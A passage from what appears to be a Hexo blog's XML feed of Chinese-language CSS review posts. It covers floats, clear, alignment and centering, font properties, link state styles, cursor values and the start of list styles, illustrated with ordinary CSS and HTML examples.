class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果两个定位元素重叠，没有指定 z - index，最后定位在 HTML 代码中的元素将被显示在最前面。</p><h2 id="9-浮动（Float）"><a href="#9-浮动（Float）" class="headerlink" title="9.浮动（Float）"></a>9.浮动（Float）</h2><p>CSS float 属性定义元素在哪个方向浮动，浮动元素会生成一个块级框，直到该块级框的外边缘碰到包含框或者其他的浮动框为止。CSS 的 Float（浮动），会使元素向左或向右移动，其周围的元素也会重新排列。Float（浮动），往往是用于图像，但它在布局时一样非常有用。</p><p>元素的水平方向浮动，意味着元素只能左右移动而不能上下移动。一个浮动元素会尽量向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。浮动元素之后的元素将围绕它。浮动元素之前的元素将不会受到影响。</p><p>浮动属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th><th align="center">值</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">clear</td><td align="center">指定不允许元素周围有浮动元素。</td><td align="center">left right both none inherit</td><td align="center">1</td></tr><tr><td align="center">float</td><td align="center">指定一个盒子（元素）是否可以浮动。</td><td align="center">left right none inherit</td><td align="center">1</td></tr></tbody></table><p>实例：如果图像是右浮动，文本流将环绕在它左边：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-1-彼此相邻的浮动元素"><a href="#9-1-彼此相邻的浮动元素" class="headerlink" title="9.1 彼此相邻的浮动元素"></a>9.1 彼此相邻的浮动元素</h3><p>如果把几个浮动的元素放到一起，如果有空间的话，它们将彼此相邻。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.thumbnail</span>&#123;<br><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">110px</span>;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">90px</span>;<br><span class="hljs-attribute">margin</span>:<span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-2-清除浮动（clear）"><a href="#9-2-清除浮动（clear）" class="headerlink" title="9.2 清除浮动（clear）"></a>9.2 清除浮动（clear）</h3><p>元素浮动之后，周围的元素会重新排列，为了避免这种情况，使用 clear 属性。clear 属性指定元素两侧不能出现浮动元素。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.text_line</span>&#123;<br><span class="hljs-attribute">clear</span>:both;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="10-水平对齐（Horizontal-Align）"><a href="#10-水平对齐（Horizontal-Align）" class="headerlink" title="10.水平对齐（Horizontal Align）"></a>10.水平对齐（Horizontal Align）</h2><p>关于 CSS 中元素的水平对齐 (Horizontal Align)，可以使用多种属性来进行设置。</p><h3 id="10-1-块元素对齐"><a href="#10-1-块元素对齐" class="headerlink" title="10.1 块元素对齐"></a>10.1 块元素对齐</h3><p>块元素是一个元素，占用了全宽，前后都是换行符。</p><h3 id="10-2-中心对齐（margin）"><a href="#10-2-中心对齐（margin）" class="headerlink" title="10.2 中心对齐（margin）"></a>10.2 中心对齐（margin）</h3><p>块元素可以把左，右页边距设置为”自动”对齐。margin属性可任意拆分为左，右页边距设置自动指定，结果都是出现居中元素：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span>&#123;<br><span class="hljs-attribute">margin-left</span>:auto;<br><span class="hljs-attribute">margin-right</span>:auto;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">70%</span>;<br><span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0e0e6</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="10-3-左右对齐（position）"><a href="#10-3-左右对齐（position）" class="headerlink" title="10.3 左右对齐（position）"></a>10.3 左右对齐（position）</h3><p>元素对齐的方法之一是使用绝对定位：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.right</span>&#123;<br><span class="hljs-attribute">position</span>:absolute;<br><span class="hljs-attribute">right</span>:<span class="hljs-number">0px</span>;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">300px</span>;<br><span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0e0e6</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>绝对定位与文档流无关，所以它们可以覆盖页面上的其它元素。</p><h3 id="10-4-左右对齐（float）"><a href="#10-4-左右对齐（float）" class="headerlink" title="10.4 左右对齐（float）"></a>10.4 左右对齐（float）</h3><p>使用 float 属性是对齐元素的方法之一：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.right</span>&#123;<br><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">300px</span>;<br><span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0e0e6</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="垂直居中对齐（padding）"><a href="#垂直居中对齐（padding）" class="headerlink" title="垂直居中对齐（padding）"></a>垂直居中对齐（padding）</h3><p>CSS 中一个简单的设置垂直居中对齐的方式就是头部顶部使用 padding：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123; <span class="hljs-attribute">padding</span>: <span class="hljs-number">70px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green; &#125;<br></code></pre></div></td></tr></table></figure><p>如果要水平和垂直都居中，可以使用 padding 和 text-align: center：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123; <span class="hljs-attribute">padding</span>: <span class="hljs-number">70px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green; <span class="hljs-attribute">text-align</span>: center; &#125;<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（二）</title>
    <link href="/2021/05/13/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/13/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-字体（fonts）"><a href="#1-字体（fonts）" class="headerlink" title="1.字体（fonts）"></a>1.字体（fonts）</h2><p>CSS字体属性定义字体，加粗，大小，文字样式。</p><h3 id="1-1-字型"><a href="#1-1-字型" class="headerlink" title="1.1 字型"></a>1.1 字型</h3><ul><li>通用字体系列 - 拥有相似外观的字体系统组合（如 “Serif” 或 “Monospace”）</li><li>特定字体系列 - 一个特定的字体系列（如 “Times” 或 “Courier”）</li></ul><p>除了各种特定的字体系列外，CSS 定义了 5 种通用字体系列：</p><ul><li>Serif 字体</li><li>Sans-serif 字体</li><li>Monospace 字体</li><li>Cursive 字体</li><li>Fantasy 字体</li></ul><h3 id="1-2-字体系列（font-family）"><a href="#1-2-字体系列（font-family）" class="headerlink" title="1.2 字体系列（font-family）"></a>1.2 字体系列（font-family）</h3><p>font-family 属性设置文本的字体系列。font-family 属性应该设置几个字体名称作为一种”后备”机制，如果浏览器不支持第一种字体，他将尝试下一种字体。</p><p>如果字体系列的名称超过一个字，它必须用引号，如 Font Family：”宋体”。多个字体系列是用一个逗号分隔指明。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<span class="hljs-attribute">font-family</span>:<span class="hljs-string">&quot;Times New Roman&quot;</span>, Times, serif;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-字体样式（font-style）"><a href="#1-3-字体样式（font-style）" class="headerlink" title="1.3 字体样式（font-style）"></a>1.3 字体样式（font-style）</h3><p>主要是用于指定斜体文字的字体样式属性。这个属性有三个值：正常 - 正常显示文本、斜体 - 以斜体字显示的文字、倾斜的文字 - 文字向一边倾斜（和斜体非常类似，但不太支持）。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.normal</span> &#123;<span class="hljs-attribute">font-style</span>:normal;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.italic</span> &#123;<span class="hljs-attribute">font-style</span>:italic;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.oblique</span> &#123;<span class="hljs-attribute">font-style</span>:oblique;&#125;<br></code></pre></div></td></tr></table></figure><p><strong>italic 和 oblique 的区别</strong></p><ul><li>斜体（italic）是一种简单的字体风格，对每个字母的结构有一些小改动，来反映变化的外观。</li><li>倾斜（oblique）文本是正常竖直文本的一个倾斜版本。</li></ul><p>通常情况下，italic 和 oblique 文本在 web 浏览器中看上去完全一样。</p><h3 id="1-4字体大小（font-size）"><a href="#1-4字体大小（font-size）" class="headerlink" title="1.4字体大小（font-size）"></a>1.4字体大小（font-size）</h3><p>font-size 属性设置文本的大小。字体大小的值可以是绝对或相对的大小。</p><blockquote><p>绝对大小：</p></blockquote><ul><li>设置一个指定大小的文本</li><li>不允许用户在所有浏览器中改变文本大小</li><li>确定了输出的物理尺寸时绝对大小很有用</li></ul><blockquote><p>相对大小：</p></blockquote><ul><li>相对于周围的元素来设置大小</li><li>允许用户在浏览器中改变文字大小</li></ul><p>如果不指定一个字体的大小，默认大小和普通文本段落一样，是16像素（16px=1em）。</p><h3 id="1-5-设置字体大小像素"><a href="#1-5-设置字体大小像素" class="headerlink" title="1.5 设置字体大小像素"></a>1.5 设置字体大小像素</h3><p>设置文字的大小与像素，能完全控制文字大小。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">40px</span>;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">30px</span>;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-6-用em来设置字体大小"><a href="#1-6-用em来设置字体大小" class="headerlink" title="1.6 用em来设置字体大小"></a>1.6 用em来设置字体大小</h3><p>为了避免 Internet Explorer 中无法调整文本的问题，许多开发者使用 em 单位代替像素。em 的尺寸单位由W3C建议。1em 和当前字体大小相等。在浏览器中默认的文字大小是16px。因此，1em的默认大小是16px。可以通过下面这个公式将像素转换为em：px/16=em</p><p><strong>注意：</strong>注：16 等于父元素的默认字体大小，假设父元素的 font-size 为 30px，那么公式需改为：pixels/30=em。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">2.5em</span>;&#125; <span class="hljs-comment">/* 40px/16=2.5em */</span><br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">1.875em</span>;&#125; <span class="hljs-comment">/* 30px/16=1.875em */</span><br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">0.875em</span>;&#125; <span class="hljs-comment">/* 14px/16=0.875em */</span><br></code></pre></div></td></tr></table></figure><h3 id="1-7-用百分比和em组合"><a href="#1-7-用百分比和em组合" class="headerlink" title="1.7 用百分比和em组合"></a>1.7 用百分比和em组合</h3><p>在所有浏览器的解决方案中，设置 &lt;body&gt;元素的默认字体大小的是百分比。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">100%</span>;&#125;<br><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">2.5em</span>;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">1.875em</span>;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">0.875em</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-8-字体属性"><a href="#1-8-字体属性" class="headerlink" title="1.8 字体属性"></a>1.8 字体属性</h3><table><thead><tr><th align="center">Property</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">font</td><td align="center">在一个声明中设置所有的字体属性</td></tr><tr><td align="center">font-family</td><td align="center">指定文本的字体系列</td></tr><tr><td align="center">font-size</td><td align="center">指定文本的字体大小</td></tr><tr><td align="center">font-style</td><td align="center">指定文本的字体样式</td></tr><tr><td align="center">font-variant</td><td align="center">以小型大写字体或者正常字体显示文本。</td></tr><tr><td align="center">font-weight</td><td align="center">指定字体的粗细。</td></tr></tbody></table><h2 id="2-链接样式"><a href="#2-链接样式" class="headerlink" title="2.链接样式"></a>2.链接样式</h2><p>不同的链接可以有不同的样式。链接的样式，可以用任何 CSS 属性（如颜色，字体，背景等）。特别的链接，可以有不同的样式，这取决于他们是什么状态。</p><p>四个链接状态：</p><blockquote><ul><li>a:link - 正常，未访问过的链接</li><li>a:visited - 用户已访问过的链接</li><li>a:hover - 当用户鼠标放在链接上时</li><li>a:active - 链接被点击的那一刻</li></ul></blockquote><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF0000</span>;&#125;      <span class="hljs-comment">/* 未访问链接*/</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#00FF00</span>;&#125;  <span class="hljs-comment">/* visited link */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF00FF</span>;&#125;  <span class="hljs-comment">/* mouse over link */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#0000FF</span>;&#125;  <span class="hljs-comment">/* selected link */</span><br></code></pre></div></td></tr></table></figure><p>当设置为若干链路状态的样式，也有一些顺序规则：</p><blockquote><ol><li>a:hover 必须跟在 a:link 和 a:visited 后面</li><li>a:active 必须跟在 a:hover 后面</li></ol></blockquote><h3 id="2-1-文本修饰（text-decoration）"><a href="#2-1-文本修饰（text-decoration）" class="headerlink" title="2.1 文本修饰（text-decoration）"></a>2.1 文本修饰（text-decoration）</h3><p>text-decoration 属性主要用于删除链接中的下划线。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">text-decoration</span>:none;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">text-decoration</span>:none;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">text-decoration</span>:underline;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">text-decoration</span>:underline;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-背景颜色（background-color）"><a href="#2-2-背景颜色（background-color）" class="headerlink" title="2.2 背景颜色（background-color）"></a>2.2 背景颜色（background-color）</h3><p>背景颜色属性指定链接背景色。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#B2FF99</span>;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#FFFF85</span>;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#FF704D</span>;&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#FF704D</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-3-鼠标形状"><a href="#2-3-鼠标形状" class="headerlink" title="2.3 鼠标形状"></a>2.3 鼠标形状</h3><p>常用鼠标形状。</p><table><thead><tr><th align="center">属性值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">default</td><td align="center">默认光标，箭头</td></tr><tr><td align="center">pointer</td><td align="center">超链接的指针，手型</td></tr><tr><td align="center">wait</td><td align="center">指示程序正在忙</td></tr><tr><td align="center">help</td><td align="center">指示可用的帮忙</td></tr><tr><td align="center">text</td><td align="center">指示文本</td></tr><tr><td align="center">crosshair</td><td align="center">鼠标呈现十字状</td></tr></tbody></table><h3 id="2-4-光标类型-形状（cursor）"><a href="#2-4-光标类型-形状（cursor）" class="headerlink" title="2.4 光标类型/形状（cursor）"></a>2.4 光标类型/形状（cursor）</h3><p>可能的值。</p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><em>url</em></td><td align="center">需使用的自定义光标的 URL。注释：请在此列表的末端始终定义一种普通的光标，以防没有由 URL 定义的可用光标。</td></tr><tr><td align="center">default</td><td align="center">默认光标（通常是一个箭头）</td></tr><tr><td align="center">auto</td><td align="center">默认。浏览器设置的光标。</td></tr><tr><td align="center">crosshair</td><td align="center">光标呈现为十字线。</td></tr><tr><td align="center">pointer</td><td align="center">光标呈现为指示链接的指针（一只手）</td></tr><tr><td align="center">move</td><td align="center">此光标指示某对象可被移动。</td></tr><tr><td align="center">e-resize</td><td align="center">此光标指示矩形框的边缘可被向右（东）移动。</td></tr><tr><td align="center">ne-resize</td><td align="center">此光标指示矩形框的边缘可被向上及向右移动（北/东）。</td></tr><tr><td align="center">nw-resize</td><td align="center">此光标指示矩形框的边缘可被向上及向左移动（北/西）。</td></tr><tr><td align="center">n-resize</td><td align="center">此光标指示矩形框的边缘可被向上（北）移动。</td></tr><tr><td align="center">se-resize</td><td align="center">此光标指示矩形框的边缘可被向下及向右移动（南/东）。</td></tr><tr><td align="center">sw-resize</td><td align="center">此光标指示矩形框的边缘可被向下及向左移动（南/西）。</td></tr><tr><td align="center">s-resize</td><td align="center">此光标指示矩形框的边缘可被向下移动（南）。</td></tr><tr><td align="center">w-resize</td><td align="center">此光标指示矩形框的边缘可被向左移动（西）。</td></tr><tr><td align="center">text</td><td align="center">此光标指示文本。</td></tr><tr><td align="center">wait</td><td align="center">此光标指示程序正忙（通常是一只表或沙漏）。</td></tr><tr><td align="center">help</td><td align="center">此光标指示可用的帮助（通常是一个问号或一个气球）。</td></tr></tbody></table><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>请把鼠标移动到单词上，可以看到鼠标指针发生变化：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:auto&quot;</span>&gt;</span><br>Auto<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:crosshair&quot;</span>&gt;</span><br>Crosshair<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:default&quot;</span>&gt;</span><br>Default<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:pointer&quot;</span>&gt;</span><br>Pointer<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:move&quot;</span>&gt;</span><br>Move<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:e-resize&quot;</span>&gt;</span><br>e-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:ne-resize&quot;</span>&gt;</span><br>ne-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:nw-resize&quot;</span>&gt;</span><br>nw-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:n-resize&quot;</span>&gt;</span><br>n-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:se-resize&quot;</span>&gt;</span><br>se-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:sw-resize&quot;</span>&gt;</span><br>sw-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:s-resize&quot;</span>&gt;</span><br>s-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:w-resize&quot;</span>&gt;</span><br>w-resize<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:text&quot;</span>&gt;</span><br>text<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:wait&quot;</span>&gt;</span><br>wait<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor:help&quot;</span>&gt;</span><br>help<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-列表样式（ul）"><a href="#3-列表样式（ul）" class="headerlink" title="3.列表样式（ul）"></a>3.列表样式（ul）</h2><p>列表属性。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">list-style</td><td align="center">简写属性。用于把所有用于列表的属性设置于一个声明中</td></tr><tr><td align="center">list-style-image</td><td align="center">将图象设置为列表项标志。</td></tr><tr><td align="center">list-style-position</td><td 